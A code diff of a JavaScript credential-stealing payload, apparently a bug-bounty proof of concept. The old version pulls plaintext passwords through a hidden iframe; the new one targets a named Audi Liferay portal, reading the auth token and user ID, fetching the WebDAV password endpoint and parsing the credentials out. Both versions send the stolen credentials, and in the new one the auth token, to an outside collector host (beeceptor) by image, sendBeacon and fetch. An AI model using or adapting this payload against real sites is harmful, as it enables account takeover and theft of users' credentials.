@@ -1,99 +1,126 @@
-// credential-stealer.js - Extracts plaintext passwords from /web/guest/add
+// credential-stealer-webdav.js - Extracts WebDAV credentials
 (function() {
-    function extractPassword() {
-        // Create hidden iframe to load the password page
-        var iframe = document.createElement('iframe');
-        iframe.src = '/web/guest/add';
-        iframe.style.position = 'absolute';
-        iframe.style.left = '-9999px';
-        iframe.style.width = '1px';
-        iframe.style.height = '1px';
-        document.body.appendChild(iframe);
-
-        iframe.onload = function() {
-            var attempts = 0;
-            var maxAttempts = 30; // Try for 30 seconds
-
-            // Poll the iframe content until password is found
-            var pollForPassword = setInterval(function() {
-                attempts++;
-
-                try {
-                    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-
-                    // Wait for iframe to fully load
-                    if (!iframeDoc || iframeDoc.readyState !== 'complete') {
-                        return; // Keep waiting
-                    }
-
-                    // Extract password from plaintext input fields
-                    var pwdInput = iframeDoc.querySelector('input[name="fake_password"]');
-                    var userInput = iframeDoc.querySelector('input[name="fake_username"]');
-
-                    if (!pwdInput || !userInput) {
-                        if (attempts >= maxAttempts) {
-                            clearInterval(pollForPassword);
-                            alert('Failed: Password inputs not found in DOM');
-                        }
-                        return;
-                    }
-
-                    // Get plaintext password directly from input value
-                    var password = pwdInput.value || pwdInput.getAttribute('value') || '';
-                    var username = userInput.value || userInput.getAttribute('value') || '';
-
-                    if (password && password.length > 0) {
-                        clearInterval(pollForPassword);
-
-                        // Exfiltrate credentials to attacker's server
-                        var attackerServer = 'https://naysser.free.beeceptor.com';
-                        var payload = '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password);
-
-                        // Method 1: Image tag (bypasses CORS, most reliable)
-                        var img = new Image();
-                        img.src = attackerServer + payload;
-                        document.body.appendChild(img);
-
-                        // Method 2: sendBeacon (reliable for logging)
-                        if (navigator.sendBeacon) {
-                            navigator.sendBeacon(attackerServer + payload);
-                        }
-
-                        // Method 3: Fetch API (backup method)
-                        fetch(attackerServer + payload).catch(function(){});
-
-                        // Display stolen credentials (for PoC demonstration)
-                        alert('CREDENTIALS STOLEN!\n\nEmail: ' + username + '\nPassword: ' + password + '\n\nSent to: ' + attackerServer);
-
-                        // Cleanup
-                        if (iframe.parentNode) {
-                            iframe.parentNode.removeChild(iframe);
-                        }
-                    } else if (attempts >= maxAttempts) {
-                        clearInterval(pollForPassword);
-                        alert('Timeout: Password field was empty after 30 seconds');
-                    }
-
-                } catch(e) {
-                    if (attempts >= maxAttempts) {
-                        clearInterval(pollForPassword);
-                        alert('Error accessing iframe: ' + e.message);
+    function extractWebDAVCredentials() {
+        try {
+            // Step 1: Extract Liferay.authToken from current page
+            var authToken = '';
+            if (typeof Liferay !== 'undefined' && Liferay.authToken) {
+                authToken = Liferay.authToken;
+            } else {
+                // Try to extract from page source
+                var scripts = document.getElementsByTagName('script');
+                for (var i = 0; i < scripts.length; i++) {
+                    var scriptContent = scripts[i].textContent || scripts[i].innerText;
+                    var match = scriptContent.match(/Liferay\.authToken\s*=\s*['"]([^'"]+)['"]/);
+                    if (match) {
+                        authToken = match[1];
+                        break;
                     }
                 }
-            }, 1000); // Check every second
-        };
-
-        iframe.onerror = function() {
-            alert('Failed to load /web/guest/add page');
-        };
+            }
+            
+            // Step 2: Extract userId from getRealUserId function
+            var userId = '';
+            if (typeof Liferay !== 'undefined' && Liferay.ThemeDisplay && Liferay.ThemeDisplay.getUserId) {
+                userId = Liferay.ThemeDisplay.getUserId();
+            } else {
+                // Try to extract from page source
+                var scripts = document.getElementsByTagName('script');
+                for (var i = 0; i < scripts.length; i++) {
+                    var scriptContent = scripts[i].textContent || scripts[i].innerText;
+                    var match = scriptContent.match(/getRealUserId:\s*function\s*\(\)\s*{\s*return\s*['"]?(\d+)['"]?/);
+                    if (match) {
+                        userId = match[1];
+                        break;
+                    }
+                }
+            }
+            
+            if (!authToken || !userId) {
+                alert('Failed to extract authToken or userId\nauthToken: ' + authToken + '\nuserId: ' + userId);
+                return;
+            }
+            
+            // Step 3: Construct WebDAV password generation URL
+            var webdavUrl = 'https://meine-audi-erlebnis-abholung.audi.de/group/guest/~/control_panel/manage?p_p_id=com_liferay_my_account_web_portlet_MyAccountPortlet&p_p_lifecycle=1&p_p_state=exclusive&p_p_mode=view&_com_liferay_my_account_web_portlet_MyAccountPortlet_javax.portlet.action=/users_admin/generate_webdav_password&_com_liferay_my_account_web_portlet_MyAccountPortlet_mvcRenderCommandName=/users_admin/generate_webdav_password&_com_liferay_my_account_web_portlet_MyAccountPortlet_p_u_i_d=' + userId + '&p_auth=' + authToken;
+            
+            // Step 4: Fetch the WebDAV password page
+            fetch(webdavUrl)
+                .then(function(response) {
+                    return response.text();
+                })
+                .then(function(html) {
+                    // Step 5: Extract WebDAV username and password from response
+                    var parser = new DOMParser();
+                    var doc = parser.parseFromString(html, 'text/html');
+                    
+                    // Extract WebDAV username (userid)
+                    var usernameInput = doc.querySelector('input[id*="owue"]') || doc.querySelector('input[value="' + userId + '"]');
+                    var webdavUsername = usernameInput ? usernameInput.value : '';
+                    
+                    // Extract WebDAV password
+                    var passwordInput = doc.querySelector('input[id*="webDAVPassword"]');
+                    var webdavPassword = passwordInput ? passwordInput.value : '';
+                    
+                    // Alternative extraction using regex if DOM parsing fails
+                    if (!webdavUsername || !webdavPassword) {
+                        var usernameMatch = html.match(/id="_com_liferay_my_account_web_portlet_MyAccountPortlet_owue"[^>]*value="([^"]+)"/);
+                        var passwordMatch = html.match(/id="_com_liferay_my_account_web_portlet_MyAccountPortlet_webDAVPassword"[^>]*value="([^"]+)"/);
+                        
+                        if (usernameMatch) webdavUsername = usernameMatch[1];
+                        if (passwordMatch) webdavPassword = passwordMatch[1];
+                    }
+                    
+                    if (!webdavUsername || !webdavPassword) {
+                        alert('Failed to extract WebDAV credentials from response');
+                        return;
+                    }
+                    
+                    // Step 6: Display credentials in alert
+                    var message = '=== WebDAV CREDENTIALS STOLEN ===\n\n';
+                    message += 'WebDAV Username: ' + webdavUsername + '\n';
+                    message += 'WebDAV Password: ' + webdavPassword + '\n\n';
+                    message += 'Original URL:\n' + webdavUrl + '\n\n';
+                    message += 'Auth Token: ' + authToken + '\n';
+                    message += 'User ID: ' + userId;
+                    
+                    alert(message);
+                    
+                    // Step 7: Send to Burp Collaborator
+                    var collaborator = 'https://naysser.free.beeceptor.com';
+                    var payload = '/?webdav_user=' + encodeURIComponent(webdavUsername) + 
+                                  '&webdav_pass=' + encodeURIComponent(webdavPassword) +
+                                  '&user_id=' + encodeURIComponent(userId) +
+                                  '&auth_token=' + encodeURIComponent(authToken) +
+                                  '&url=' + encodeURIComponent(webdavUrl);
+                    
+                    // Method 1: Image (most reliable)
+                    var img = new Image();
+                    img.src = collaborator + payload;
+                    document.body.appendChild(img);
+                    
+                    // Method 2: sendBeacon
+                    if (navigator.sendBeacon) {
+                        navigator.sendBeacon(collaborator + payload);
+                    }
+                    
+                    // Method 3: Fetch
+                    fetch(collaborator + payload).catch(function(){});
+                    
+                })
+                .catch(function(error) {
+                    alert('Error fetching WebDAV credentials: ' + error.message);
+                });
+                
+        } catch(e) {
+            alert('Error in credential extraction: ' + e.message);
+        }
     }
-
+    
     // Execute when DOM is ready
-    if (document.body) {
-        extractPassword();
-    } else if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', extractPassword);
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', extractWebDAVCredentials);
     } else {
-        window.addEventListener('load', extractPassword);
+        extractWebDAVCredentials();
     }
 })();
